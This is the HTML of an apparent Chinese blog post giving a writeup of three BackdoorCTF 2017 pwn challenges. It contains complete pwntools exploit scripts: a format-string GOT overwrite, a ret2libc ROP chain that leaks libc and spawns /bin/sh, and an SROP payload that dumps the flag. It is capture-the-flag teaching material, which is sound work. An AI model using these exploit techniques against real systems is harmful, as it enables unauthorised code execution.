@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="BABY-0x41414141eaysy fmt vul 12345678910111213141516171819#!&#x2F;usr&#x2F;bin&#x2F;env python# coding&#x3D;utf-8from pwn import *context.clear(arch &#x3D; &amp;#x27;i386&amp;#x27;)#context.log_level &#x3D; &amp;#x27;debug&amp;#x27;#io &#x3D; remote(&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BackdoorCTF 2017 Pwn Writeup">
+<meta property="og:url" content="https://bestwing.me/2017-backdoor-CTF-Pwn.html">
+<meta property="og:site_name" content="Swing&#39;Blog 有恨无人省">
+<meta property="og:description" content="BABY-0x41414141eaysy fmt vul 12345678910111213141516171819#!&#x2F;usr&#x2F;bin&#x2F;env python# coding&#x3D;utf-8from pwn import *context.clear(arch &#x3D; &amp;#x27;i386&amp;#x27;)#context.log_level &#x3D; &amp;#x27;debug&amp;#x27;#io &#x3D; remote(&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoodr-just-do-it-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-02.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-03.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-01.jpg">
+<meta property="og:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-02.jpg">
+<meta property="article:published_time" content="2017-09-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-10-28T13:27:47.000Z">
+<meta property="article:author" content="Swing">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="BackdoorCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoodr-just-do-it-01.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>BackdoorCTF 2017 Pwn Writeup</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Swing&#39;Blog 有恨无人省" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2017-XDCTF-Pwn-Writeup.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/Mac-Surge-2.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-backdoor-CTF-Pwn.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&text=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&is_video=false&description=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BackdoorCTF 2017 Pwn Writeup&body=Check out this article: https://bestwing.me/2017-backdoor-CTF-Pwn.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&name=BackdoorCTF 2017 Pwn Writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-backdoor-CTF-Pwn.html&t=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BABY-0x41414141"><span class="toc-number">1.</span> <span class="toc-text">BABY-0x41414141</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JUST-DO-IT"><span class="toc-number">2.</span> <span class="toc-text">JUST-DO-IT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-%E7%BC%96%E5%86%99"><span class="toc-number">2.1.</span> <span class="toc-text">exploit 编写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ropchain"><span class="toc-number">2.1.1.</span> <span class="toc-text">ropchain</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FUNSIGNALS"><span class="toc-number">3.</span> <span class="toc-text">FUNSIGNALS</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        BackdoorCTF 2017 Pwn Writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Swing'Blog 有恨无人省</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-09-28T16:00:00.000Z" itemprop="datePublished">2017-09-29</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Writeup/">Writeup</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/BackdoorCTF/" rel="tag">BackdoorCTF</a>, <a class="tag-link-link" href="/tags/pwn/" rel="tag">pwn</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="BABY-0x41414141"><a href="#BABY-0x41414141" class="headerlink" title="BABY-0x41414141"></a>BABY-0x41414141</h2><p>eaysy fmt vul</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch = <span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(&#x27;163.172.176.29&#x27;, 9035)</span></span><br><span class="line">io = process(<span class="string">&#x27;./32_new&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print io.recvline()</span></span><br><span class="line"><span class="keyword">print</span> io.recvuntil(<span class="string">&#x27;Hello baby pwner, whats your name?\n&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">72</span>/<span class="number">4</span>+<span class="number">60</span>, &#123;<span class="number">0x804a034</span>:<span class="number">0x0804870b</span>&#125;,numbwritten=<span class="number">72</span>,write_size = <span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line"></span><br><span class="line">raw_input(<span class="string">&#x27;pause&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="string">&#x27;aa&#x27;</span>+payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> io.recvall(timeout = <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
+
+<h2 id="JUST-DO-IT"><a href="#JUST-DO-IT" class="headerlink" title="JUST-DO-IT"></a>JUST-DO-IT</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; checksec</span><br><span class="line">[*] <span class="string">&#x27;/home/swing/Desktop/CTF-Pwn/backdoor/justdoit/32_chal.dms&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+
+<p>IDA：<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoodr-just-do-it-01.jpg"><br>栈溢出：</p>
+<p>尝试覆盖eip</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;A&quot;</span>*<span class="number">0x64</span>+<span class="string">&quot;BBBB&quot;</span>+<span class="string">&quot;CCCC&quot;</span>+<span class="string">&quot;DDDD&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-02.jpg"><br>所以当我们当输入为 112 + 4的时候能覆盖eip，我们就能控制程序跳转</p>
+<h3 id="exploit-编写"><a href="#exploit-编写" class="headerlink" title="exploit 编写"></a>exploit 编写</h3><p>因为题目开启了NX，所以思路是构造leak，去泄漏计算libc地址，然后计算system 地址，构造rop</p>
+<h4 id="ropchain"><a href="#ropchain" class="headerlink" title="ropchain"></a>ropchain</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ropchain = <span class="string">&quot;A&quot;</span>*<span class="number">112</span></span><br><span class="line">ropchain += p32(write_plt)</span><br><span class="line">ropchain += p32(main_addr)</span><br><span class="line">ropchain += p32(<span class="number">1</span>)</span><br><span class="line">ropchain += p32(read_got)</span><br><span class="line">ropchain += p32(<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
+
+<p>但是 最后我发现我得到远程一直断，然后发现他给的libc有问题</p>
+<p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/2017-backdoor-ctf-just-do-it-03.jpg"></p>
+<p>第二次栈溢出的时候重新计算 距离eip的距离</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*104</span><br><span class="line">payload += p32(system_addr)</span><br></pre></td></tr></table></figure>
+<p>将会覆盖eip为system地址<br>所以第二段payload构造为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">payload += p32(binsh_addr)</span><br></pre></td></tr></table></figure>
+
+<p>完整exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">ip = <span class="string">&quot;163.172.176.29&quot;</span></span><br><span class="line">port = <span class="number">9036</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./32_chal.dms&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">main_addr =  <span class="number">0x804847d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt;<span class="number">1</span>:</span><br><span class="line">    debug = <span class="literal">True</span></span><br><span class="line">    local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    debug = <span class="literal">False</span></span><br><span class="line">    local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    read_offset = libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_offset = next(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">    read_offset = <span class="number">0xd4350</span></span><br><span class="line">    system_offset = <span class="number">0x3a940</span></span><br><span class="line">    binsh_offset = <span class="number">0x15900b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    <span class="comment">#io = process(&quot;./32_chal.dms&quot;,env = &#123;&quot;LD_PRELOAD&quot;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">    io = process(<span class="string">&quot;./32_chal.dms&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip,port)</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ropchain = <span class="string">&quot;A&quot;</span>*<span class="number">112</span></span><br><span class="line">ropchain += p32(write_plt)</span><br><span class="line">ropchain += p32(main_addr)</span><br><span class="line">ropchain += p32(<span class="number">1</span>)</span><br><span class="line">ropchain += p32(read_got)</span><br><span class="line">ropchain += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.sendline(ropchain)</span><br><span class="line"></span><br><span class="line">read_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;read_addr: 0x%x&quot;</span> % read_addr)</span><br><span class="line">libc_base = read_addr - read_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment">#log.info(&quot;system_offset:0x%x&quot; % libc.symbols[&quot;system&quot;])</span></span><br><span class="line"><span class="comment">#log.info(&quot;binsh_offset: 0x%x&quot; % next(libc.search(&quot;/bin/sh\x00&quot;)))</span></span><br><span class="line">log.info(<span class="string">&quot;system_addr: 0x%x&quot;</span> % system_addr)</span><br><span class="line">log.info(<span class="string">&quot;binsh_addr: 0x%x&quot;</span> % binsh_addr)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;break *0x80484b9&#x27;&#x27;&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">104</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line">io.recv()</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#io.recv()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="FUNSIGNALS"><a href="#FUNSIGNALS" class="headerlink" title="FUNSIGNALS"></a>FUNSIGNALS</h2><p><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-01.jpg">syscall 先是调用read </p>
+<p>但是没有ret 很干阿。。。</p>
+<p>但是发现他调用了 sys_rt_sigreturn 卧槽 这不是srop吗…<br><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/17-backdoor-ctf-funsignals-02.jpg"><br>发现其实flag是写在bin程序里的</p>
+<p>所以只要构造rop，调用writeup，将这个flag读出来就可以了。。。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_write</span><br><span class="line">frame.rdi = constants.STDOUT_FILENO</span><br><span class="line">frame.rsi = <span class="number">0x10000023</span> <span class="comment">#flag string address</span></span><br><span class="line">frame.rdx = <span class="number">50</span> <span class="comment">#read size</span></span><br><span class="line">frame.rsp = <span class="number">0xABADCAFE</span></span><br><span class="line">frame.rip = <span class="number">0x10000015</span> <span class="comment">#syscall gadget</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./player_bin.dms&quot;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#io = remote(&quot;163.172.176.29&quot;, 9034)</span></span><br><span class="line">io.send(str(frame))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BABY-0x41414141"><span class="toc-number">1.</span> <span class="toc-text">BABY-0x41414141</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JUST-DO-IT"><span class="toc-number">2.</span> <span class="toc-text">JUST-DO-IT</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exploit-%E7%BC%96%E5%86%99"><span class="toc-number">2.1.</span> <span class="toc-text">exploit 编写</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ropchain"><span class="toc-number">2.1.1.</span> <span class="toc-text">ropchain</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FUNSIGNALS"><span class="toc-number">3.</span> <span class="toc-text">FUNSIGNALS</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://bestwing.me/2017-backdoor-CTF-Pwn.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&text=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&is_video=false&description=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=BackdoorCTF 2017 Pwn Writeup&body=Check out this article: https://bestwing.me/2017-backdoor-CTF-Pwn.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&title=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://bestwing.me/2017-backdoor-CTF-Pwn.html&name=BackdoorCTF 2017 Pwn Writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://bestwing.me/2017-backdoor-CTF-Pwn.html&t=BackdoorCTF 2017 Pwn Writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    Swing
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="https://bestwing.me">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/link">Links</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/atom.xml">rss</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
